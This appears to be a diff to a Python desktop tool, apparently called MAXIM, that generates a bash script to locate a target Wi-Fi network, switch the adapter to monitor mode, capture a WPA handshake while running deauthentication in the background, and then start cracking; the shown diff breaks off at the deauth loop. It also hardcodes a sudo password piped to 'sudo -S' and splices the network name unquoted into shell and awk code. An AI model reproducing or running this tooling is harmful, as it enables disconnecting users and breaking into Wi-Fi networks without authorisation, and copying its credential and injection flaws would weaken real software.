@@ -1098,60 +1098,72 @@ class MaximWindow(QMainWindow):
         except FileNotFoundError:
             pass
 
-        # ── Dead simple bash script — grep+cut, nothing fancy ──
+        # ── Bash script: iw scan (no ncurses) → airodump capture ──
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
         script.write("#!/bin/bash\n")
         script.write("echo '5505' | sudo -S -v 2>/dev/null\n")
         script.write(f"mkdir -p '{essid_dir}'\n")
         script.write(f"rm -f '{signal_file}'\n\n")
-        # Step 1: Monitor mode
-        script.write(f"echo '[1/3] Monitor mode on {iface}'\n")
+
+        # Step 1: Set managed mode for iw scan (iw scan needs managed mode)
+        script.write(f"echo '[1/3] Scanning for {essid}...'\n")
         script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
-        script.write(f"sudo iw dev {iface} set type monitor 2>/dev/null\n")
+        script.write(f"sudo iw dev {iface} set type managed 2>/dev/null\n")
         script.write(f"sudo ip link set {iface} up 2>/dev/null\n")
-        script.write(f"MON={iface}\n")
-        script.write(f"if iw dev {iface}mon info >/dev/null 2>&1; then MON={iface}mon; fi\n")
-        script.write("echo \"Interface: $MON\"\necho\n\n")
-        # Step 2: Scan ALL channels (no --essid), then grep for target in CSV.
-        script.write(f"echo '[2/3] Scanning for {essid}...'\n")
+        script.write("sleep 1\n\n")
+
+        # Step 2: Use 'iw dev scan' to find BSSID and channel — no ncurses, no CSV parsing
         script.write("BSSID=''\nCHANNEL=''\n")
         script.write("for i in 1 2 3 4 5; do\n")
-        script.write(f"  rm -f {scan_file}-* 2>/dev/null\n")
-        script.write(f"  sudo timeout 20 airodump-ng -w '{scan_file}' --output-format csv --write-interval 1 $MON || true\n")
-        script.write("  clear\n")
-        script.write(f"  echo 'Scanning for: {essid} (attempt '$i'/5)'\n")
-        script.write(f"  if [ -f '{scan_file}-01.csv' ]; then\n")
-        # grep for lines with a MAC that also contain our ESSID (field 14)
-        script.write(f"    LINE=$(grep -i '{essid}' '{scan_file}-01.csv' | grep -E '^[0-9A-Fa-f]{{2}}:' | head -1)\n")
-        script.write("    if [ -n \"$LINE\" ]; then\n")
-        script.write("      BSSID=$(echo \"$LINE\" | cut -d, -f1 | tr -d ' ')\n")
-        script.write("      CH_RAW=$(echo \"$LINE\" | cut -d, -f4 | tr -d ' ')\n")
-        # Validate channel is a positive integer 1-165; if not, try field 3 and 5
-        script.write("      CHANNEL=''\n")
-        script.write("      for FNUM in $CH_RAW $(echo \"$LINE\" | cut -d, -f3 | tr -d ' ') $(echo \"$LINE\" | cut -d, -f5 | tr -d ' ') $(echo \"$LINE\" | cut -d, -f6 | tr -d ' '); do\n")
-        script.write("        if echo \"$FNUM\" | grep -qE '^[0-9]+$' && [ \"$FNUM\" -ge 1 ] && [ \"$FNUM\" -le 165 ]; then\n")
-        script.write("          CHANNEL=$FNUM\n")
-        script.write("          break\n")
-        script.write("        fi\n")
-        script.write("      done\n")
-        script.write("      if [ -n \"$CHANNEL\" ] && [ -n \"$BSSID\" ]; then\n")
-        script.write("        echo \"Found: BSSID=$BSSID Channel=$CHANNEL\"\n")
-        script.write("        break\n")
-        script.write("      else\n")
-        script.write("        echo \"Found entry but invalid channel ($CH_RAW), retrying...\"\n")
-        script.write("        BSSID=''\n")
+        script.write(f"  echo \"Scan attempt $i/5...\"\n")
+        # iw scan outputs blocks like:
+        #   BSS aa:bb:cc:dd:ee:ff(on wlan1)
+        #       freq: 2437
+        #       SSID: MAX
+        # We parse BSSID, freq, SSID from the block matching our ESSID
+        script.write(f"  SCAN=$(sudo iw dev {iface} scan 2>/dev/null)\n")
+        script.write("  if [ -n \"$SCAN\" ]; then\n")
+        # Use awk to find the block with our ESSID
+        script.write("    RESULT=$(echo \"$SCAN\" | awk '\n")
+        script.write("      /^BSS / { bssid=$2; sub(/\\(.*/, \"\", bssid); freq=\"\"; ssid=\"\" }\n")
+        script.write("      /freq:/ { freq=$2 }\n")
+        script.write("      /SSID:/ { ssid=$2 }\n")
+        script.write("      ssid == \"" + essid + "\" && bssid != \"\" && freq != \"\" { print bssid, freq; exit }\n")
+        script.write("    ')\n")
+        script.write("    if [ -n \"$RESULT\" ]; then\n")
+        script.write("      BSSID=$(echo \"$RESULT\" | cut -d' ' -f1)\n")
+        script.write("      FREQ=$(echo \"$RESULT\" | cut -d' ' -f2)\n")
+        # Convert frequency to channel
+        script.write("      if [ \"$FREQ\" -ge 2412 ] && [ \"$FREQ\" -le 2484 ]; then\n")
+        script.write("        CHANNEL=$(( ($FREQ - 2407) / 5 ))\n")
+        script.write("        if [ \"$FREQ\" -eq 2484 ]; then CHANNEL=14; fi\n")
+        script.write("      elif [ \"$FREQ\" -ge 5180 ]; then\n")
+        script.write("        CHANNEL=$(( ($FREQ - 5000) / 5 ))\n")
         script.write("      fi\n")
+        script.write("      echo \"Found: BSSID=$BSSID Freq=$FREQ Channel=$CHANNEL\"\n")
+        script.write("      break\n")
         script.write("    fi\n")
         script.write("  fi\n")
         script.write(f"  echo '{essid} not found yet...'\n")
+        script.write("  sleep 2\n")
         script.write("done\n\n")
-        script.write(f"rm -f {scan_file}-* 2>/dev/null\n\n")
-        script.write("if [ -z \"$BSSID\" ]; then\n")
+
+        script.write("if [ -z \"$BSSID\" ] || [ -z \"$CHANNEL\" ]; then\n")
         script.write(f"  echo 'Could not find {essid}'\n")
         script.write(f"  echo 'FAILED' > '{signal_file}'\n")
         script.write("  read -p 'Press Enter to close'\n  exit 1\nfi\n\n")
-        # Step 3: Capture foreground + deauth background
-        script.write("echo\necho '[3/3] Capturing handshake...'\n")
+
+        # Step 3: Switch to monitor mode for capture
+        script.write("echo\necho '[2/3] Monitor mode...'\n")
+        script.write(f"sudo ip link set {iface} down\n")
+        script.write(f"sudo iw dev {iface} set type monitor\n")
+        script.write(f"sudo ip link set {iface} up\n")
+        script.write(f"MON={iface}\n")
+        script.write(f"if iw dev {iface}mon info >/dev/null 2>&1; then MON={iface}mon; fi\n")
+        script.write("echo \"Interface: $MON\"\n\n")
+
+        # Step 4: Capture handshake (foreground) + deauth (background)
+        script.write("echo '[3/3] Capturing handshake...'\n")
         script.write("echo \"Target: $BSSID ch $CHANNEL\"\n")
         script.write("echo 'MAXIM will auto-detect handshake and start cracking.'\necho\n\n")
         script.write("(\n  sleep 3\n  for j in $(seq 1 30); do\n")
